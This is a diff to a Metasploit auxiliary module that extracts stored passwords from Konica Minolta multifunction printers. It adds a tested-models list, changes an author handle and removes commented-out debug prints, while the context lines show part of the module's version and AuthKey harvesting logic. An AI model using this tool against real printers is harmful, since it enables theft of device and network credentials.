@@ -18,11 +18,20 @@ class Metasploit3 < Msf::Auxiliary
     super(update_info(info,
       'Name'           => 'Konica Minolta Password Exractor',
       'Description'    => %{
-        This module will extract the passwords from Konica Minolta mfp devices .
+        This module will extract the passwords from Konica Minolta mfp devices.
+        Tested Models:,
+        C224,
+        C280
+         283,
+        C353,
+        C360,
+         420,
+        C452,
+        C454e,
       },
       'Author'         =>
         [
-          'Deral "Percent_x" Heiland',
+          'Deral "Percentx" Heiland',
           'Pete "Bokojan" Arzamendi'
         ],
       'License'        => MSF_LICENSE
@@ -138,7 +147,6 @@ class Metasploit3 < Msf::Auxiliary
       minor_parse = xml0_body.xpath("//Minor").text
       $major = ("#{major_parse}")
       $minor = ("#{minor_parse}")
-      #print_good("#{$major}")
 
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
     print_error("#{rhost} - Version check Connection failed.")
@@ -161,7 +169,6 @@ class Metasploit3 < Msf::Auxiliary
         },datastore['TIMEOUT'].to_i)
       xml1_body= ::Nokogiri::XML(response.body)
       authkey_parse = xml1_body.xpath("//AuthKey").text
-      #print_good("AuthKey= #{authkey_parse}")
       $authkey = ("#{authkey_parse}")
 
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
